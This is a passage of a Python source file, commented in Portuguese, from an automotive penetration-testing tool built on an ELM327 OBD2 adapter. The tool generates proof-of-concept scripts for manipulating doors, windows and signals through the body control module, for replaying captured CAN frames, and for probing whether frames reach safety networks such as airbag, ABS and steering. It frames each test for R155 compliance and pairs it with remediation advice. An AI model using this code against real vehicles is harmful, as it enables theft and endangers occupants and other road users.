        "janelas, portas e sinalização via CAN bus representa:\n"
        "  • Risco imediato à segurança física dos ocupantes (portas abertas em movimento)\n"
        "  • Acionamento indevido de sinalização em tráfego (risco de acidentes)\n"
        "  • Acesso não autorizado ao veículo via destravamento remoto\n"
        "  • Violação da UNECE R155 Annex 5 §3.4 — manipulação física via CAN\n"
        "Este tipo de ataque foi demonstrado publicamente por pesquisadores da Universidade "
        "de Illinois e no Car Hacking Village da DEF CON desde 2015."
    )
    result.attacker_scenario = (
        "CENÁRIO 1 — Destravamento de portas:\n"
        "  1. Conecta ELM327 ao OBD2 (3s de acesso físico)\n"
        f"  2. ATSH{can_map['bcm_addr']} — aponta para BCM\n"
        "  3. Abre Extended Session (10 03)\n"
        f"  4. Envia {can_map.get('door_lock',{}).get('unlock','N/A')} para destravamento\n"
        "  5. Veículo destrancado sem chave física\n\n"
        "CENÁRIO 2 — Controle de janelas em movimento:\n"
        f"  1. Frame ID {can_map.get('window_fl',{}).get('id','N/A')} com payload de abertura\n"
        "  2. Janela abre enquanto veículo está em movimento — risco de segurança\n\n"
        "CENÁRIO 3 — Via BLE IVI (sem acesso físico):\n"
        "  1. Exploita vulnerabilidade BLE no IVI (PerfektBlue/BLUFFS)\n"
        "  2. Obtém execução de código no IVI\n"
        "  3. Usa bridge IVI→CAN para enviar frames de controle\n"
        "  4. Controle remoto completo sem nenhum acesso físico"
    )
    result.recommendations = [
        "CRÍTICO: Implementar autenticação UDS (Service 0x27) antes de aceitar IO Control (0x2F)",
        "Validar IDs de origem dos frames CAN — rejeitar frames de IDs não autorizados",
        "Implementar MAC (Message Authentication Code) nos frames CAN sensíveis",
        "Isolar barramento CAN de carroceria do barramento OBD/diagnóstico",
        "Implementar rate limiting no BCM — limite de X comandos de janela/porta por segundo",
        "Logar e alertar tentativas de IO Control fora de sessão autorizada",
    ]

    result.poc_script = _test_header(
        "VEH-003", "Body Control — Janela/Porta/Sinalização", elm_mac,
        f"Demonstra controle de BCM via CAN. Fabricante: {vehicle_make}.\n"
        "MODO SEGURO: use payloads de leitura antes de ativar controles reais.",
        "ATM T-BCM-001", "R155 Annex 5 §3.4"
    ) + f'''
# ── CONFIGURAÇÃO DO VEÍCULO ──────────────────────────────────────────────────
VEHICLE_MAKE = "{vehicle_make}"
BCM_ADDR    = "{can_map['bcm_addr']}"

# CAN IDs identificados para este veículo/plataforma
CONTROLS = {{
''' + "\n".join(
    f'    "{k}": {{"id": "{v["id"]}", "desc": "{v["desc"]}", '
    f'"payload_demo": "0000000000000000"}},'
    for k, v in can_map.items() if k != "bcm_addr"
) + '''
}

# Payload REAL (substituir após captura passiva VEH-001):
# WINDOW_FL_OPEN  = ''' + f'"{can_map.get("window_fl",{}).get("open","CAPTURAR VIA VEH-001")}"' + '''
# WINDOW_FL_CLOSE = ''' + f'"{can_map.get("window_fl",{}).get("close","CAPTURAR VIA VEH-001")}"' + '''
# DOOR_UNLOCK     = ''' + f'"{can_map.get("door_lock",{}).get("unlock","CAPTURAR VIA VEH-001")}"' + '''
# TURN_LEFT_ON    = ''' + f'"{can_map.get("turn_left",{}).get("on","CAPTURAR VIA VEH-001")}"' + '''
# TURN_RIGHT_ON   = ''' + f'"{can_map.get("turn_right",{}).get("on","CAPTURAR VIA VEH-001")}"' + '''
# HAZARD_ON       = ''' + f'"{can_map.get("hazard",{}).get("on","CAPTURAR VIA VEH-001")}"' + '''

if not elm.connect(): sys.exit(1)
elm.init()
print(f"[*] VEH-003: Body Control — {VEHICLE_MAKE}")
print(f"[*] BCM Address: 0x{BCM_ADDR}\\n")

# Fase 1: Apontar para BCM e abrir sessão de diagnóstico
elm.send(f"ATSH{BCM_ADDR}")
resp = elm.send("10 03")  # Extended Diagnostic Session
print(f"[*] Extended Session: {resp}")

if "50" in resp:
    print("[+] BCM Extended Session ACEITA — controles acessíveis!")
    print()
    print("[*] Fase 2: Testando superfície de controle (modo seguro — sem ativar)")
    print()

    for name, ctrl in CONTROLS.items():
        # Usa payload de demonstração neutro — não ativa o controle real
        resp = elm.send(f"ATSH{ctrl['id']}")
        print(f"  [MAP] {ctrl['desc']}: CAN ID 0x{ctrl['id']}")
        print(f"        Payload de ativação real: substituir CAPTURAR VIA VEH-001")

    print()
    print("[!] PARA ATIVAR CONTROLES REAIS (ambiente controlado):")
    print("    1. Capturar payload via ATMA durante acionamento manual (VEH-001)")
    print("    2. Substituir 'CAPTURAR VIA VEH-001' pelo payload real")
    print("    3. Descomentar: elm.send(f\\"ATSH{ctrl['id']}\\"); elm.send(WINDOW_FL_OPEN)")
else:
    nrc = resp.split()[-1] if resp.split() else "??"
    print(f"[-] BCM não aceitou Extended Session (NRC: 0x{nrc})")
    print("[~] Proteção detectada — tentar com Security Access (27 01) primeiro")

print()
print("=" * 60)
print("VEH-004: CAN Replay Attack — próxima etapa")
print("=" * 60)
'''

    result.poc_commands = [
        f"ATSH{can_map['bcm_addr']}", "10 03", "27 01",
        f"ATSH{can_map.get('door_lock',{}).get('id','3B3')}",
        "# <payload de unlock após captura VEH-001>",
    ]
    result.duration_s = time.time() - t0
    return result


# ─── VEH-004: CAN Replay Attack ──────────────────────────────────────────────

def test_can_replay(driver: Optional[ELM327Driver], elm_mac: str) -> VehicleTestResult:
    """
    VEH-004: Ataque de replay de frames CAN.
    Captura frames legítimos e os retransmite para acionar funções sem autorização.
    ATM: Lateral Movement — CAN Frame Replay
    R155: Annex 5 §3.3
    """
    result = VehicleTestResult(
        test_id="VEH-004",
        test_name="CAN Frame Replay Attack",
        atm_technique="Lateral Movement / Execution — CAN Frame Replay",
        target_ecu="Multiple ECUs",
        r155_ref="R155 Annex 5 §3.3",
        iso21434_ref="ISO/SAE 21434 §8.4",
        atm_ref="ATM: T-CAN-002",
    )
    t0 = time.time()

    captured_frames: List[CANFrame] = []

    if driver and driver.conn.connected:
        # Captura tráfego por 5s
        driver.send_at("ATMA")  # Monitor All
        time.sleep(0.5)
        raw = driver.send_at("")  # Lê o que foi capturado

        # Parse frames capturados
        for line in raw.split("\n"):
            line = line.strip()
            if line and len(line.split()) >= 2:
                parts = line.split()
                if len(parts[0]) in (3, 4):  # CAN ID
                    cf = CANFrame(can_id=parts[0], data=" ".join(parts[1:]))
                    captured_frames.append(cf)

        result.evidence.append(f"Frames capturados em 5s: {len(captured_frames)}")
        driver.send_at("ATPC")  # Stop monitoring

        if captured_frames:
            result.status = "confirmed"
            result.severity = "high"
            for f in captured_frames[:10]:
                result.evidence.append(f"  CAN ID {f.can_id}: {f.data[:30]}")
        else:
            result.status = "partial"
            result.severity = "high"
            result.evidence.append("Sem frames capturados — veículo pode estar em modo garagem")
    else:
        result.status = "surface_only"
        result.severity = "high"
        result.evidence.append("Modo análise — script PoC para captura e replay disponível")

    result.business_impact = (
        "O ataque de replay de CAN não requer conhecimento do protocolo proprietário — "
        "apenas captura e retransmissão de frames legítimos. Qualquer função acionada "
        "fisicamente pelo proprietário pode ser replicada sem limite de tempo ou distância "
        "(via BLE relay). Especialmente crítico para sistemas de entrada sem chave (PKE) "
        "e funções de diagnóstico remoto."
    )
    result.attacker_scenario = (
        "1. Atacante instala mini-dispositivo CAN sniffer no OBD2 do alvo\n"
        "2. Captura frames durante uso normal do veículo por dias/semanas\n"
        "3. Identifica frames de abertura de porta, janela, ignição\n"
        "4. Retransmite frames capturados via ELM327 ou dispositivo custom\n"
        "5. Ou: usa BLE relay para retransmitir frames a distância ilimitada"
    )
    result.recommendations = [
        "Implementar rolling codes nos frames CAN sensíveis (anti-replay)",
        "Adicionar timestamp criptografado ou nonce nos frames de controle",
        "Implementar janela de tempo — rejeitar frames mais antigos que X ms",
        "Usar MACs (Message Authentication Codes) em frames de carroceria",
        "Hardware Security Module (HSM) nas ECUs críticas para validação de frames",
    ]

    result.poc_script = _test_header(
        "VEH-004", "CAN Replay Attack", elm_mac,
        "Captura frames CAN legítimos e os retransmite para acionar funções.",
        "ATM T-CAN-002", "R155 Annex 5 §3.3"
    ) + '''
if not elm.connect(): sys.exit(1)
elm.init()
print("[*] VEH-004: CAN Replay Attack\\n")

# Fase 1: Captura passiva
print("[*] Fase 1: Capturando frames CAN por 10s (ATMA)...")
elm.send("ATMA")
time.sleep(10)
raw = elm.send("")
elm.send("ATPC")  # para captura

frames = []
for line in raw.split("\\n"):
    parts = line.strip().split()
    if len(parts) >= 2 and len(parts[0]) in (3,4):
        frames.append((parts[0], " ".join(parts[1:])))

print(f"[+] {len(frames)} frames capturados")
for can_id, data in frames[:10]:
    print(f"  CAN {can_id}: {data}")

if not frames:
    print("[-] Nenhum frame — tente com ignição ligada")
    sys.exit(0)

# Fase 2: Replay seletivo
print()
print("[*] Fase 2: Replay dos frames capturados...")
print("[!] Selecione o frame alvo pelo CAN ID (ou Enter para todos):")
target_id = input("CAN ID (ex: 3B3) ou Enter: ").strip().upper()

replayed = 0
for can_id, data in frames:
    if target_id and can_id != target_id:
        continue
    elm.send(f"ATSH{can_id}")
    resp = elm.send(data.replace(" ", ""))
    print(f"  [REPLAY] {can_id}: {data} → {resp[:20]}")
    replayed += 1
    time.sleep(0.05)

print()
print("=" * 60)
print(f"RESULTADO: {replayed} frame(s) retransmitido(s)")
print()
print("IMPACTO (R155 Annex 5 §3.3):")
print("  Frames capturados podem ser repetidos indefinidamente.")
print("  Sem rolling codes = qualquer função é replicável por um atacante.")
print("=" * 60)
'''

    result.poc_commands = ["ATMA", "# <aguardar 10s>", "ATPC", "# <analisar frames>",
                            "# ATSH<ID>; <payload>  -- replay"]
    result.duration_s = time.time() - t0
    return result


# ─── VEH-005: Gateway Security Analysis ──────────────────────────────────────

def test_gateway_security(driver: Optional[ELM327Driver], elm_mac: str) -> VehicleTestResult:
    """
    VEH-005: Análise de segmentação e segurança do gateway CAN.
    Verifica isolamento entre redes, filtros de frames e capacidade de bridge.
    ATM: Defense Evasion — Bridge Vehicle Networks
    R155: Annex 5 §3.5
    """
    result = VehicleTestResult(
        test_id="VEH-005",
        test_name="CAN Gateway Security Analysis",
        atm_technique="Defense Evasion / Discovery — Bridge Vehicle Networks",
        target_ecu="CAN Gateway / CGW",
        r155_ref="R155 Annex 5 §3.5",
        iso21434_ref="ISO/SAE 21434 §8.3",
        atm_ref="ATM: T-GWY-001",
    )
    t0 = time.time()

    # Testa se frames enviados via OBD chegam em outras redes
    gateway_probes = [
        ("7FF", "00 00 00 00 00 00 00 00", "Broadcast para redes internas"),
        ("7E0", "3E 00",                   "Tester Present — ECM"),
        ("7A0", "3E 00",                   "Tester Present — Gateway"),
        ("726", "3E 00",                   "Tester Present — Powertrain"),
        ("760", "3E 00",                   "Tester Present — Chassis"),
    ]

    gateway_responds = []
    no_filter_detected = False

    if driver and driver.conn.connected:
        for can_id, payload, desc in gateway_probes:
            driver.send_at(f"ATSH{can_id}")
            resp = driver.send_at(payload.replace(" ", ""))
            if resp and "NO DATA" not in resp.upper() and "?" not in resp:
                gateway_responds.append((can_id, resp[:30], desc))
                result.evidence.append(f"ID {can_id} respondeu ({desc}): {resp[:40]}")

        # Testa se frames CAN chegam em redes não-diagnóstico
        # Envia para IDs de redes de segurança (airbag: 7A2, ABS: 760)
        for safety_id in ["7A2", "760", "740", "730"]:
            driver.send_at(f"ATSH{safety_id}")
            resp = driver.send_at("3E00")  # TesterPresent — inofensivo
            if resp and "7F" not in resp and "NO DATA" not in resp:
                no_filter_detected = True
                result.evidence.append(
                    f"CRÍTICO: Frame chegou à rede de segurança ID {safety_id} — "
                    f"gateway sem filtros!"
                )

        result.status = "confirmed" if no_filter_detected else "partial"
        result.severity = "critical" if no_filter_detected else "high"
    else:
        result.status = "surface_only"
        result.severity = "high"
        result.evidence.append("Análise de gateway sem ELM327 — baseada em vetores conhecidos")
        result.evidence.append("Veículos sem gateway seguro permitem bridge entre redes OBD e CAN de segurança")

    result.business_impact = (
        "Um gateway CAN sem filtros adequados permite movimento lateral entre redes — "
        "atacante que ganha acesso à rede de diagnóstico (via OBD2 ou BLE IVI) pode "
        "enviar frames para redes de segurança críticas: airbag, ABS, direção, freios. "
        "Este é o vetor que transforma um ataque cibernético em risco de vida — "
        "exatamente o escopo que motivou a criação da UNECE R155."
    )
    result.attacker_scenario = (
        "Fase 1 (Acesso): Exploita BLE IVI (PerfektBlue/BLUFFS) → execução no IVI\n"
        "Fase 2 (Pivot): IVI está conectado ao CAN diagnóstico\n"
        "Fase 3 (Bridge): Gateway sem filtros permite enviar para CAN de segurança\n"
        "Fase 4 (Impacto): Frames para ABS (760), airbag (7A2), direção (730)\n"
        "Resultado: Controle de sistemas de segurança ativa em movimento"
    )
    result.recommendations = [
        "CRÍTICO: Implementar gateway CAN com allowlist de CAN IDs por rede",
        "Filtrar TODOS os frames da rede OBD que não sejam respostas a diagnóstico autorizado",
        "Redes de segurança (airbag, ABS, steering) devem ser ISOLADAS fisicamente",
        "Implementar firewall de CAN com regras estáticas e logging",
        "Penetration testing semestral das interfaces de gateway (exigência R155 §7.3)",
    ]

    result.poc_script = _test_header(
        "VEH-005", "Gateway Security Analysis", elm_mac,
        "Verifica se frames CAN enviados via OBD2 chegam em redes internas de segurança.",
        "ATM T-GWY-001", "R155 Annex 5 §3.5"
    ) + '''
if not elm.connect(): sys.exit(1)
elm.init()
print("[*] VEH-005: Gateway Security Analysis\\n")

# Redes CAN típicas em veículos modernos
networks = {
    "Diagnóstico/OBD": ["7DF", "7E0", "7E8"],
    "Carroceria (BCM)": ["7B0", "7B8", "3B3"],
    "Powertrain":       ["7E0", "726", "720"],
    "Chassis/ADAS":     ["760", "740", "7A0"],
    "Segurança (airbag/ABS)": ["7A2", "730", "750"],
}

print("[*] Testando alcance entre redes via gateway...")
reachable = {}

for network, ids in networks.items():
    print(f"\\n  Rede: {network}")
    for can_id in ids:
        elm.send(f"ATSH{can_id}")
        resp = elm.send("3E00")  # TesterPresent — inofensivo
        reachable_flag = resp and "NO DATA" not in resp.upper() and "?" not in resp
        flag = "[ALCANÇÁVEL]" if reachable_flag else "[ bloqueado ]"
        print(f"    {flag} CAN ID 0x{can_id}: {resp[:30] if resp else 'sem resp'}")
        if reachable_flag and "Segurança" in network:
            reachable[can_id] = network

print()
print("=" * 60)
print("RELATÓRIO — GATEWAY SECURITY")
print("=" * 60)
if reachable:
    print(f"[!!] CRÍTICO: {len(reachable)} ID(s) de segurança ALCANÇÁVEIS via OBD!")
    for can_id, net in reachable.items():
        print(f"     0x{can_id} ({net}) — bridge não filtrado detectado")
    print()
    print("IMPACTO R155 Annex 5 §3.5:")
    print("  Atacante pode enviar frames para sistemas de segurança ativa.")
    print("  Movimento lateral completo: OBD → Airbag/ABS/Direção")
else:
    print("[+] Gateway filtra frames entre redes OBD e redes de segurança")
    print("[~] Continuar testando com payloads mais específicos")
print("=" * 60)
'''

    result.poc_commands = ["ATSH7FF", "3E 00", "ATSH760", "3E 00", "ATSH7A2", "3E 00"]
    result.duration_s = time.time() - t0
    return result


# ─── Orquestrador ─────────────────────────────────────────────────────────────

def run_automotive_tests(
    elm_mac: str,
    connection_type: str = "bluetooth",
    port: str = "",
    vehicle_make: str = "generic",
    test_ids: Optional[List[str]] = None,
) -> Dict[str, Any]:
    """
    Executa bateria de testes veiculares.
    Retorna dict com resultados e metadados.
    """
    conn = ELM327Connection(
        port=port or elm_mac,
        connection_type=connection_type,
    )

    driver = None
    connection_result = {"connected": False, "error": None, "elm_version": ""}

    # Tenta conectar ao ELM327
    try:
        drv = ELM327Driver(conn)
        if drv.connect():
            driver = drv
            conn.protocol = conn.elm_version or drv.get_protocol()
            conn.vin = drv.get_vin()
            connection_result = {
                "connected": True,
                "elm_version": conn.elm_version,
                "protocol": conn.protocol,
                "vin": conn.vin,
                "error": None,
            }
        else:
            connection_result["error"] = conn.error or "Falha na conexão"
    except Exception as e:
        connection_result["error"] = str(e)

    # Executa testes
    all_tests = {
        "VEH-001": lambda: test_can_recon(driver, elm_mac),
        "VEH-002": lambda: test_uds_session(driver, elm_mac),
        "VEH-003": lambda: test_body_control(driver, elm_mac, vehicle_make),
        "VEH-004": lambda: test_can_replay(driver, elm_mac),
        "VEH-005": lambda: test_gateway_security(driver, elm_mac),
    }

    selected = test_ids or list(all_tests.keys())
    results = []

    for test_id in selected:
        if test_id in all_tests:
            try:
                r = all_tests[test_id]()
                results.append(vehicle_result_to_dict(r))
            except Exception as e:
                results.append({
                    "test_id": test_id, "test_name": test_id,
                    "status": "error", "severity": "info",
                    "evidence": [str(e)], "duration_s": 0,
                })

    if driver:
        driver.close()

    # Resumo
    confirmed = [r for r in results if r["status"] == "confirmed"]
    critical = [r for r in confirmed if r["severity"] == "critical"]

    return {
        "elm_mac": elm_mac,
        "connection": connection_result,
        "vehicle_make": vehicle_make,
        "tests_run": len(results),
        "confirmed": len(confirmed),
        "critical": len(critical),
        "results": results,
        "atm_coverage": list(ATM_TECHNIQUES.keys()),
        "r155_coverage": ["Annex 5 §3.1", "§3.2", "§3.3", "§3.4", "§3.5"],
        "timestamp": time.time(),
    }


def vehicle_result_to_dict(r: VehicleTestResult) -> Dict[str, Any]:
    return {
        "test_id": r.test_id,
        "test_name": r.test_name,
        "atm_technique": r.atm_technique,
        "target_ecu": r.target_ecu,
        "status": r.status,
        "severity": r.severity,
        "evidence": r.evidence,
        "business_impact": r.business_impact,
        "attacker_scenario": r.attacker_scenario,
        "r155_ref": r.r155_ref,
        "iso21434_ref": r.iso21434_ref,
        "atm_ref": r.atm_ref,
        "poc_script": r.poc_script,
        "poc_commands": r.poc_commands,
        "raw_responses": r.raw_responses[:20],
        "obd_data": r.obd_data,
        "can_frames": [{"id": f.can_id, "data": f.data, "dir": f.direction}
                       for f in r.can_frames[:20]],
        "recommendations": r.recommendations,
        "duration_s": round(r.duration_s, 2),
    }
